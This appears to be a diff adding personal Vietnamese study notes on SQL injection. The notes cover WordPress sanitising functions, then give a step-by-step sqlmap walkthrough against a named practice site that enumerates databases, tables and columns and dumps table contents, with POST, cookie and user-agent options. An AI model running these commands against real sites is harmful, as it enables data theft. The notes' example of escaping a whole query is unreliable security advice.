@@ -1,0 +1,57 @@
+https://viblo.asia/p/su-dung-sqlmap-de-khai-thac-lo-hong-sql-injection-sqli-6J3ZgzVAKmB
+https://whitehat.vn/threads/huong-dan-su-dung-sqlmap-de-khai-thac-sql-injection.8343/
+
+workpress
+https://tanvietblog.com/wordpress-ngan-chan-tan-cong-sql-injection
+https://codex.wordpress.org/Data_Validation
+
+Tất cả các hàm trong WordPress được thiết kế chống SQL Injection được chia thành 2 trường hợp là input validation và query preparing.
+a, Input Validation (Kiểm tra giá trị nhập vào từ các thẻ input)
+
+Trong nhiều trường hợp, website của bạn có chứa form mà yêu cầu nhập thông tin từ phía người dùng thì luôn luôn phải kiểm tra các giá trị đó trước khi cập nhật vào database. Bao gồm các hàm sau :
+
++ esc_html($input): Hàm này sẽ mã hóa các chuỗi nhập vào, về chức năng thì nó tương tự như hàm htmlspecialchars() , chỉ khác ở chỗ là nếu hàm htmlspecialchars()được thực thi 2 lần thì hàm đó mã hóa 2 lần chuỗi nhập vào.
+
++ wp_kses($string, $allowed_html): Hàm này sẽ xóa những thẻ tag HTML không mong muốn được quy định trong biến $allowed_html.
+
++ esc_url($input): Hàm này sẽ kiểm tra đường dẫn người dùng nhập vào có đúng không.
+
+VD: https://tanvietblog.com => Chấp nhận ; http://sadsadsa => Không chấp nhận.
+
++ is_email($email): Kiểm tra địa chỉ email có hợp lệ hay không.
+
++intval($input): Lấy giá trị số nguyên của biến nhập vào.
+
+b, Query preparing (mã hóa câu truy vấn)
+
+Nếu dịch theo nghĩa tường minh thì Query preparing có nghĩa là “Chuẩn bị cho truy vấn” , đại ý là cần đảm bảo rằng dữ liệu chèn vào database là dữ liệu “sạch”. Điều này được thực hiện dễ dàng với 2 hàm trong WordPress là esc_sql($query) hoặc $wpdb->escape($query).
+
+Trong đó lớp $wpdb chịu trách nhiệm thao tác với cơ sở dữ liệu bao gồm thêm, sửa, xóa…Các bạn có thể tìm hiểu thêm $wpdb tại đây.
+
+Về cơ bản thì 2 hàm trên tương tự như hàm addslashes() trong PHP, tức là nó sẽ chèn dấu ‘\’ vào câu truy vấn.
+
+Sau đây tôi có một câu lệnh như sau :
+$query = $wpdb->escape("SELECT * from $wpdb->posts WHERE post_id=$id");
+
+
+~~~~~~~~~~~
+python sqlmap.py –u  “http://zerocoolhf.altervista.org/level1.php?id=1”  "-u" theo sau là đường dẫn Lệnh này để kiểm tra url trên có dính lỗi sqli không
+python sqlmap.py –u “http://zerocoolhf.altervista.org/level1.php?id=1” --dbs Khi đã xác định được url trên bị lỗi, sử dụng flag "--dbs" để liệt kê các database
+python sqlmap.py –u “http://zerocoolhf.altervista.org/level1.php?id=1” --tables –D my_zerocoolhf 
+
+Như trong bài viết đã liệt kê được 2 database là my_zerocoolhf và infomation_schema -D my_zerocoolhf: 
+báo cho sqlmap.py biết chương trình sẽ làm việc với database my_zerocoolhf --table: dùng để liệt kê các bảng trong database my_zerocoolhf
+
+python sqlmap.py –u “http://zerocoolhf.altervista.org/level1.php?id=1” --columns –D my_zerocoolhf –T book 
+Lệnh 3 đã liệt kê ra các bảng của my_zerocoolhf, lệnh 4 dùng để liệt kê ra tên cột có trong bảng book sự khác biệt giữa -T và --table là --table 
+dùng để liệt kê, -T là lựa chọn để chương trình làm việc với bảng book
+
+python sqlmap.py –u “http://zerocoolhf.altervista.org/level1.php?id=1” --dump –D my_zerocoolhf –T book --dump
+
+: dùng để dump toàn bộ dữ liệu của bảng book
+
+--data="DATA" : sử dụng cho phương thức POST,  ex: khi login thường hay sử dụng python sqlmap.py -u "url/path" --data "user=mark&passwd=line"
+--cookie="cookie" : sử dụng khi lỗ hổng nằm trong cookie
+--user-agent=AGENT : có thể ứng dụng kiểm tra trường user-agent trong header nên tùy chọn --user-agent sử dụng trong trường hợp này ex: python sqlmap.py -u "url/path" --data "user=mark&passwd=line" --user-agent "Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/"  
+ (user-agent của chrome trên android)
+
